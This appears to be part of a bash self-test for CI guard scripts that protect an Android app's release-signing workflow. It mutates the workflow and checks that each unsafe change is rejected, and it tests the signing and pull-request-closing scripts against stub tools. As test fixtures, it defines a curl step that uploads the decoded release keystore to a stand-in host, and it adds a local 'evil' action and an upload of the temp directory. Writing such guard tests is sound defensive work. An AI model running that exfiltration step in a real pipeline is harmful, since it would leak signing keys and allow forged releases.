    expect_environment_error "$job with the keystore password read from the keystore secret" 'sign step env is not exactly'
    mutate release.yml "$sign_of.env.KEYSTORE_B64 = \"\${{ secrets.${other_up}_KEYSTORE_B64 }}\""
    expect_environment_error "$job with the other app's keystore secret" 'more than one app'
    mutate release.yml "$sign_of.env.APP = \"../../tmp/x\""
    expect_environment_error "$job with a path as APP" 'sign step env is not exactly'
    mutate release.yml "$sign_of.env.APP = \"$other\""
    expect_environment_error "$job with the other app as APP" 'sign step env is not exactly'
    mutate release.yml "$sign_of.env.EXPECTED_SHA256 = \"0000\""
    expect_environment_error "$job with a fixed EXPECTED_SHA256" 'sign step env is not exactly'
    mutate release.yml ".jobs.$job.runs-on = \"self-hosted\""
    expect_environment_error "$job on a self-hosted runner" 'runs-on must be'
    mutate release.yml ".jobs.$job.needs = [\"build\", \"publish\"]"
    expect_environment_error "$job with changed needs" 'needs must be\|runs-on must be'
done
mutate release.yml '.jobs.build.steps += [{"name": "Early", "run": "true", "env": {"K": "${{ secrets.LENSLY_KEYSTORE_PASS }}"}}]'
expect_environment_error "the build job reading a keystore secret" 'without environment: release'
mutate release.yml '.jobs.build.environment = "release" | .jobs.build.steps += [{"name": "Late", "run": "true", "env": {"K": "${{ secrets.LENSLY_KEYSTORE_PASS }}"}}]'
expect_environment_error "the build job with the release environment that reads a keystore secret and runs Gradle" 'runs Gradle'
mutate release.yml '.jobs.publish.steps += [{"name": "Late", "run": "true", "env": {"K": "${{ secrets.LENSLY_KEYSTORE_PASS }}"}}]'
expect_environment_error "the publish job reading a keystore secret" 'without environment: release'
mutate release.yml '.jobs.build.if = "always()"'
expect_environment_error "a build job that runs on always()" 'not one of the expressions listed in JOB_IF'

# --- A job that reads a signing secret has exactly the allowlisted steps (#1531): checkout, refusal, download-artifact, the sign script,
# the keystore cleanup, upload-artifact. Each extra or changed step is rejected, wherever it sits.
expect_steps_error() { expect_environment_error "$1" 'steps must be exactly'; }
for job in sign_lensly sign_lumio; do
    s=".jobs.$job.steps"
    exfil='{"name": "Report", "run": "curl -sS --data-binary @\"$RUNNER_TEMP/release.keystore\" https://example.invalid"}'
    mutate release.yml "$s = $s[0:5] + [$exfil] + $s[5:]"
    expect_steps_error "$job with a run step between the sign script and the cleanup"
    mutate release.yml "$s = $s[0:4] + [$exfil] + $s[4:]"
    expect_steps_error "$job with a run step between the signing step and the cleanup"
    mutate release.yml "$s += [$exfil]"
    expect_steps_error "$job with a run step after the upload"
    mutate release.yml "$s = $s[0:3] + [$exfil] + $s[3:]"
    expect_steps_error "$job with a run step before the signing step"
    mutate release.yml "$s += [{\"uses\": \"actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9\", \"with\": {\"name\": \"keystore\", \"path\": \"/home/runner/work/_temp/\"}}]"
    expect_steps_error "$job with a second upload-artifact step"
    mutate release.yml "($s[] | select(.uses == \"actions/upload-artifact*\") | .with.path) = \"/home/runner/work/_temp/\""
    expect_steps_error "$job uploading another path"
    mutate release.yml "($s[] | select(.uses == \"actions/download-artifact*\") | .with.name) = \"other\""
    expect_steps_error "$job downloading another artifact"
    mutate release.yml "($s[] | select(.uses == \"actions/upload-artifact*\") | .uses) = \"actions/upload-artifact@v7\""
    expect_steps_error "$job with an upload-artifact not pinned by SHA"
    mutate release.yml "($s[] | select(.name == \"Check, align and sign the APK\") | .run) = \"bash scripts/ci/sign-release.sh; true\""
    expect_steps_error "$job with a signing step that runs more than the script"
    mutate release.yml "($s[] | select(.name == \"Check, align and sign the APK\") | .env.BASH_ENV) = \"/tmp/x\""
    expect_steps_error "$job with a signing step with an extra env variable"
    mutate release.yml "($s[] | select(.name == \"Delete the decoded keystore\") | .run) = \"true\""
    expect_steps_error "$job with a cleanup step that does not delete the keystore"
    mutate release.yml "del($s[] | select(.name == \"Delete the decoded keystore\"))"
    expect_steps_error "$job without the cleanup step"
    mutate release.yml "$s = [$s[0], $s[1], $s[3], $s[2], $s[4], $s[5]]"
    expect_steps_error "$job with the download and the sign step swapped"
    mutate release.yml "$s += [{\"uses\": \"./evil\"}]"
    expect_steps_error "$job with a local action"
done
# A job that reads no signing secret keeps its freedom: the build and publish jobs have many steps.
expect_pass "the real workflows, after the step mutations" "$guards"

# --- The Gradle ban in a job that reads a signing secret matches the word as a token, not as a substring (#1532).
# Each of these hides Gradle behind quoting, a backslash or an invisible character; the steps are the real ones, so only the ban can reject them.
for hidden in './gr""adlew :app:assembleRelease' "./gr''adlew" './gr\adlew' './gradlew' 'gradle build' 'g"r"adle' $'./gradle\xe2\x80\x8bw'; do
    HIDDEN="sign lensly $hidden" mutate release.yml '.jobs.sign_lensly.name = strenv(HIDDEN)'
    expect_environment_error "a sign job that names Gradle as: $hidden" 'runs Gradle'
done
for word in 'gradlefree' 'upgradle' 'degradlew' 'gradle_free'; do
    HIDDEN="sign lensly $word" mutate release.yml '.jobs.sign_lensly.name = strenv(HIDDEN)'
    expect_pass "a sign job whose name has a word that only contains gradle: $word" guard_with
done

# --- sign-release.sh: the hash check, the secrets check and the version-code check come before anything is signed.
signer=$root/scripts/ci/sign-release.sh
sdir=$work/sign
rm -rf "$sdir"
mkdir -p "$sdir/unsigned" "$sdir/tools" "$sdir/tmp"
printf 'apk bytes' >"$sdir/unsigned/lensly.apk"
good_sha=$(sha256sum "$sdir/unsigned/lensly.apk" | cut -d' ' -f1)
cat >"$sdir/tools/aapt2" <<'STUB'
#!/usr/bin/env bash
echo "package: name='app.lensly' versionCode='$FAKE_VERSION_CODE' versionName='1.0.0' platformBuildVersionName='15'"
STUB
cat >"$sdir/tools/zipalign" <<'STUB'
#!/usr/bin/env bash
cp "$5" "$6"
STUB
cat >"$sdir/tools/apksigner" <<'STUB'
#!/usr/bin/env bash
[ "${KEYSTORE_PASS:-}" = secret ] || exit 3
while [ $# -gt 1 ]; do [ "$1" = --out ] && out=$2; shift; done
cp "$1" "$out"
STUB
chmod +x "$sdir/tools/"*
sign_with() {
    # sign_with <expected sha> <version code> <keystore b64> <password>
    (cd "$sdir" && rm -rf signed && env APP=lensly EXPECTED_SHA256="$1" FAKE_VERSION_CODE="$2" KEYSTORE_B64="$3" KEYSTORE_PASS="$4" \
        BUILD_TOOLS="$sdir/tools" RUNNER_TEMP="$sdir/tmp" bash "$signer")
}
keystore_b64=$(printf 'keystore bytes' | base64)
expect_fail "an APK whose SHA-256 differs from the build job's" sign_with "$(printf %064d 0)" 7 "$keystore_b64" secret
expect_fail "an empty expected SHA-256" sign_with "" 7 "$keystore_b64" secret
expect_fail "a missing keystore secret" sign_with "$good_sha" 7 "" secret
expect_fail "a missing keystore password" sign_with "$good_sha" 7 "$keystore_b64" ""
expect_fail "version code 1" sign_with "$good_sha" 1 "$keystore_b64" secret
expect_fail "no version code" sign_with "$good_sha" "" "$keystore_b64" secret
expect_pass "an APK that matches its hash, with version code 7" sign_with "$good_sha" 7 "$keystore_b64" secret
[ -f "$sdir/signed/lensly.apk" ] || fail "sign-release.sh wrote no signed/lensly.apk"

# --- close-refresh-pr.sh: a stub gh whose first close fails (and records the comment first, as the old gh pr close --comment did).
# Whether the first gh pr comment fails before posting ("drop") or after it ("lost"), the pull request ends closed with one comment.
bin=$work/bin
mkdir -p "$bin"
cat >"$bin/gh" <<'STUB'
#!/usr/bin/env bash
# State lives in $GH_STUB_DIR: state, comments (one per line), close-calls, comment-calls, comment-mode (ok, drop or lost).
d=$GH_STUB_DIR
bump() { local n=$(($(cat "$d/$1") + 1)); echo "$n" >"$d/$1"; echo "$n"; }
record() { while [ $# -gt 0 ]; do [ "$1" = "$FLAG" ] && echo "$2" >>"$d/comments"; shift; done; }
case "$1 $2" in
    "pr view")
        case "$*" in
            *"--json state"*) cat "$d/state" ;;
            *"--json comments"*) cat "$d/comments" ;;
        esac ;;
    "pr close")
        n=$(bump close-calls)
        FLAG=--comment record "$@"
        [ "$n" -gt 1 ] || exit 1
        echo CLOSED >"$d/state" ;;
    "pr comment")
        n=$(bump comment-calls)
        mode=$(cat "$d/comment-mode")
        [ "$mode $n" = "drop 1" ] && exit 1
        FLAG=--body record "$@"
        [ "$mode $n" = "lost 1" ] && exit 1
        exit 0 ;;
esac
STUB
chmod +x "$bin/gh"
export GH_STUB_DIR=$work/stub GH_REPO=owner/repo RUN_URL=https://github.com/owner/repo/actions/runs/1
close_pr() { PATH=$bin:$PATH "$root/scripts/ci/close-refresh-pr.sh" 7 >/dev/null 2>&1; }
comment_count() { wc -l <"$GH_STUB_DIR/comments" | tr -d ' '; }
for mode in ok drop lost; do
    rm -rf "$GH_STUB_DIR"
    mkdir -p "$GH_STUB_DIR"
    echo OPEN >"$GH_STUB_DIR/state"
    : >"$GH_STUB_DIR/comments"
    echo 0 >"$GH_STUB_DIR/close-calls"
    echo 0 >"$GH_STUB_DIR/comment-calls"
    echo "$mode" >"$GH_STUB_DIR/comment-mode"
    for attempt in 1 2 3 4; do
        close_pr && break
    done
    [ "$(cat "$GH_STUB_DIR/state")" = CLOSED ] || fail "close-refresh-pr.sh left the pull request open ($mode)"
    [ "$(comment_count)" = 1 ] || fail "close-refresh-pr.sh posted $(comment_count) comments, not 1 (comment $mode)"
    close_pr || fail "close-refresh-pr.sh failed on a closed pull request ($mode)"
    [ "$(comment_count)" = 1 ] || fail "close-refresh-pr.sh commented again on a pull request it had already closed ($mode)"
done
RUN_URL= expect_fail "an empty RUN_URL" env PATH="$bin:$PATH" "$root/scripts/ci/close-refresh-pr.sh" 7

if [ "$failed" -ne 0 ]; then
    exit 1
fi
echo "selftest-guards: ok"
